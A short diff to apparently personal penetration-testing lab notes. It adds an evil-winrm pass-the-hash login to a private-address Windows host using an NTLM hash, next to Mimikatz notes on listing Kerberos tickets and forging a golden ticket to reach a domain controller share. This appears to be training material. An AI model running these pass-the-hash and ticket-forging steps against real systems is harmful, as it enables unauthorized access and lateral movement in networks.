@@ -1,3 +1,6 @@
+# Evil RM
+	evil-winrm -i 192.168.98.120 -u corpmngr -H 4cb3933610b827a281ec479031128cc6
+
 # Mimikatz
 	klist -> list all computer has ticket
  	dir \\dc01.warfare.corp\C$ -> Access is denied. -> need to create golden ticket show it will work
